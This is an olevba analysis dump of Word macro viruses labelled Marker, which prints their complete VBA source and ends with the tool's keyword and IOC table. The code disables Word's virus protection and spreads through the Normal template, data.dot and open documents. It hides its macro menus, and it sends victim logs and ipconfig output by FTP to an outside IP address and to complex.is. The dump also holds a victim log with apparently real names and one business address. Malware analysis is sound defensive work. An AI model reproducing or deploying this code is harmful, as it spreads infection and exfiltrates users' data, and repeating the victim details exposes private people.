olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-f29d9454e58973768526b45669cfaf73e2bfcad4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-f29d9454e58973768526b45669cfaf73e2bfcad4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is another marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogUploaded As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    Randomize
    
    For I = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next I
    LogFile = "C:\hsfx" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = True
  ElseIf Day(Now()) <> 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For I = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next I

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 10:19:17  - Freitag, 11 Dez 1998
' SPo0Ky
' Blue Planet
'



' 10:08:03  - Sunday, 13 Dec 1998
' Barnard
'



' 08:48:13  - Wednesday, 6 Jan 1999
' WRB
'



' 08:50:41 AM - Monday, 11 Jan 1999
' FRANK WALKER
'



' 02:47:39 PM - Thursday, 14 Jan 1999
' VPSL
'



' 08:01:39 PM - Saturday, 16 Jan 1999
' Sy Tran
' HYTEK Resources, Inc.
' 1016 Lansdale Ave
' Lansdale, PA  19446



' 07:48:18 PM - Tuesday, 2 Feb 1999
' net2
'



' 08:13:27 PM - Wednesday, 3 Mar 1999
' IRG
'



' 06:21:00 PM - Thursday, 4 Mar 1999
' Software Solution Integrated Limited
'



' 09:14:06 PM - Tuesday, 16 Mar 1999
' training
'



' 12:37:44 PM - Tuesday, 6 Apr 1999
' CTEC
'



' 01:16:55 PM - Saturday, 10 Apr 1999
' CTEC
'



' 12:19:16 PM - Monday, 3 May 1999
' rajen
'



' 10:41:04 AM - Tuesday, 8 Jun 1999
' user
'



-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Marker.fq2-f29d9454e58973768526b45669cfaf73e2bfcad4 - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public WhoAmI As String
Public DataDot As Boolean
Public NormInstalled As Boolean
Public DocInstalled As Boolean
Public NormReadOnly As Boolean
Public HoldDoc As String
Public DocThere As Boolean
Public Final_Close_Called As Boolean
Function ID_Status()
On Error Resume Next
    If MacroContainer = NormalTemplate Then
        WhoAmI = "normal"
        GoTo checkout
    End If
    If MacroContainer = ActiveDocument Then WhoAmI = "document"
    If MacroContainer = "data.dot" Then WhoAmI = "orbit"
checkout:
End Function
Function Install_Status()
On Error Resume Next
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then DataDot = True
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "groovie" Then DocInstalled = True
    Next I
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(I).Name = "groovie" Then NormInstalled = True
    Next I
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or _
    GetAttr(NormalTemplate.FullName) = vbReadOnly Then NormReadOnly = True
End Function
Function The_Groovie_Core()
On Error Resume Next
Call ID_Status
Call Install_Status
    If WhoAmI = "document" Then Call DocCodeCore
    If WhoAmI = "normal" Then Call NormCodeCore
    If WhoAmI = "orbit" Then Call OrbitCoreCode
    If NormReadOnly = False Then CommandBars("tools").Controls("Macro").Delete
    If NormReadOnly = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
End Function
Function DocCodeCore()
On Error Resume Next
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
    If NormInstalled = False And NormReadOnly = False Then
        With NormalTemplate.VBProject
        With .VBComponents.Import("c:\groovie.sys")
        End With
        End With
    End If
    If DataDot = False Then
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        If Final_Close_Called = False Then Documents.Open FileName:=HoldDoc
        Shell ("label c: groovie"), 0
        Windows(1).Close
    End If
End Function
Function NormCodeCore()
On Error Resume Next
Application.ScreenUpdating = False
    Call Check_For_Doc
    If DocInstalled = False And DocThere = True Then
        With ActiveDocument.VBProject
        With .VBComponents.Import("c:\groovie.sys")
        End With
        End With
        With Dialogs(wdDialogFileSummaryInfo)
            .Comments = "ALT-F11 says it's groovie!"
            .Execute
        End With
    End If
    If DataDot = False And DocThere = True Then
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If Final_Close_Called = False Then Documents.Open FileName:=HoldDoc
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
    If DataDot = False And DocThere = False Then
        Documents.Add Template:="", NewTemplate:=False
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", _
        FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
        Windows(1).Close SaveChanges:=wdSaveChanges
    End If
Application.ScreenUpdating = True
End Function
Function OrbitCoreCode()
On Error Resume Next
Application.ScreenUpdating = False
        If NormInstalled = False And NormReadOnly = False Then
            With NormalTemplate.VBProject
            With .VBComponents.Import("c:\groovie.sys")
            End With
            End With
            NormalTemplate.Save
        End If
        If DocInstalled = False Then
            With ActiveDocument.VBProject
            With .VBComponents.Import("c:\groovie.sys")
            End With
            End With
            With Dialogs(wdDialogFileSummaryInfo)
                .Comments = "ALT-F11 says it's groovie!"
                .Execute
            End With
        End If
Application.ScreenUpdating = True
End Function
Function Groovie_Run()
On Error Resume Next
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    HoldDoc = ActiveDocument.FullName
    Call The_Groovie_Core
    Randomize
    rn = Int(Rnd * 5)
    If rn = 3 Then Call IP_Love_You
End Function
Sub AutoOpen()
On Error Resume Next
Call Groovie_Run
End Sub
Sub AutoClose()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
End Sub
Sub AutoExit()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
End Sub
Sub FileSaveAs()
On Error Resume Next
Call Groovie_Run
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub filesave()
On Error Resume Next
Call Groovie_Run
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub
Sub fileclose()
On Error Resume Next
Final_Close_Called = True
Call Groovie_Run
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
ActiveDocument.Close
End Sub
Sub fileprint()
On Error Resume Next
Call Groovie_Run
Dialogs(wdDialogFilePrint).Show
End Sub
Function IP_Love_You()
On Error Resume Next
    Shell ("ipconfig /all /batch c:\ip.txt"), 0
    Call mscript("c:\script.sys")
    Shell ("ftp -s:c:\script.sys complex.is"), 0
End Function
Function mscript(strFile As String)
Randomize
On Error Resume Next
    one = Application.UserName
    two = Application.UserInitials
    rn = Int(Rnd * 999)
    Dim hFile As Long
    hFile = FreeFile
Open strFile For Output Access Write As hFile
    Print #hFile, "anonymous"
    Print #hFile, one & "@" & two & ".com"
    Print #hFile, "cd incoming"
    Print #hFile, "send"
    Print #hFile, "c:\ip.txt"
    Print #hFile, rn + rn & "." & two
    Print #hFile, "quit"
Close hFile
End Function
Sub viewvbcode()
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Function Check_For_Doc()
On Error GoTo docek
    If ActiveDocument.Name <> "" Then
        DocThere = True
    End If
    GoTo over
docek:
    DocThere = False
over:
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

